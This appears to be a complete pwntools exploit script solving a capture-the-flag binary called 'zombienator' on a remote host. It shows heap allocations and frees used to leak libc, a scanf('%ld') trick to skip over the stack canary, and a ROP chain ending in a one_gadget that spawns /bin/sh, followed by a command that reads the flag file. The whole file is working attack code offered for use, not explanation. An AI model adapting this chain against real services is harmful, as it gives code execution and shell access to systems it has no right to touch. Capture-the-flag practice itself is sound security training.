#!/usr/bin/python3
from pwn import *
from tqdm import tqdm
import warnings
import os
warnings.filterwarnings('ignore')
context.arch = 'amd64'
context.log_level = 'critical'

fname = './zombienator' 

# fclose cannot be bypassed locally
LOCAL = False

r    = remote('94.237.59.206', 46051)

e    = ELF(fname)
libc = ELF(e.runpath.decode() + 'libc.so.6')

rl   = lambda     : r.recvline()
sl   = lambda x   : r.sendline(x)
ru   = lambda x   : r.recvuntil(x)
sla  = lambda x,y : r.sendlineafter(x,y)

r.timeout = 0.3

def create(tier, pos):
  #sleep(0.1)
  sla('>> ', '1')
  sla('tier: ', str(tier))
  sla('5-9): ', str(pos))

def remove(pos):
  #sleep(0.1)
  sla('>> ', '2')
  sla('position: ', str(pos))

# To send payload in double format
def fmt(payload):
  sla(': ', repr(struct.unpack("d", p64(payload))[0]))

# Make 9 allocations
print('[+] Creating Zombienators..\n')
[create(128, i) for i in tqdm (range(9))]
print('\n[*] Done!\n')

# Free 8 items
print('[-] Deleting Zombienators..\n')
[remove(i) for i in tqdm (range(8))]
print('\n[*] Done!\n')

# Leak libc address
sla('>> ', '3')
ru('Slot [7]: ')
libc.address = int(u64(rl().strip().ljust(8, b'\x00'))) - 0x219ce0 
print(f'Libc base: {libc.address:#04x}')
if libc.address & 0xfff != 000:
  print('\nLibc does not end in 000\n')
  r.close()
  exit()
rop = ROP(libc, base=libc.address)

# Perform ret2libc abusing the scanf("%ld")
loops = 38
sla('>> ', '4')
sla('attacks: ', str(loops))

# Fill the buffer and bypass canary
[sla(': ', '-') for i in range(loops-5)]
sla(': ', '-')

'''
Use og with these conditions met.
The only condition that is not met is rbp == NULL,
so we find a pop rbp ; ret gadget from libc 

0x50a47 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbp == NULL || (u16)[rbp] == NULL
'''

# pop rbp ; ret 0x2a2e0
fmt(rop.find_gadget(['ret'])[0])
fmt(libc.address + 0x2a2e0)
fmt(0)
fmt(libc.address + 0x50a47)

# Bypass stderr and stdout to get flag
pause(1)
sl('cat flag*>&0')
r.interactive()

